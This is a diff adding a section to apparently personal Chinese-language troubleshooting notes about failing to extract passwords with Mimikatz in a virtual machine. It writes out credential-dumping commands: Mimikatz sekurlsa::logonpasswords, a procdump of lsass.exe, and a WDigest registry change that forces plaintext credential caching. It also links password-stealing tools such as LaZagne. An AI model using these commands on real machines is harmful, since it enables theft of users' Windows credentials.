@@ -221,7 +221,41 @@ Win+R，敲入service.msc，找到Windows Time，把启动类型修改为自动�
 
 更换软件查看。
 
+## 28、使用Mimikatz没有获取密码失败
+参考：https://www.shuzhiduo.com/A/KE5QPBkMJL/
+https://www.ngui.cc/el/1503049.html?action=onClick
+https://blog.csdn.net/syl321314362/article/details/128868549
 
+但是连基本的当前用户都没有获取到。
+由于有安全软件，无法在物理机上面测试使用。
+发现可能是我的虚拟电脑存在问题，发现使用LaZagne工具也无法获取任何信息。
 
+简单来说就是：
+在https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20220919下载mimikatz工具，然后执行：
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+可能存在获取为null密码，但亲测没有看出有什么效果：
+https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
+```
+procdump64.exe  -accepteula -ma lsass.exe lsass
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit 
+```
+
+还有修改注册表：
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
+
+rundll32.exe user32.dll,LockWorkStation
+```
+
+发现使用工具还是挺好用的：
+https://github.com/AlessandroZ/LaZagne
+https://github.com/RowTeam/SharpDecryptPwd
+https://github.com/HyperSine/how-does-navicat-encrypt-password
+https://www.freesion.com/article/93941500785/
 
 
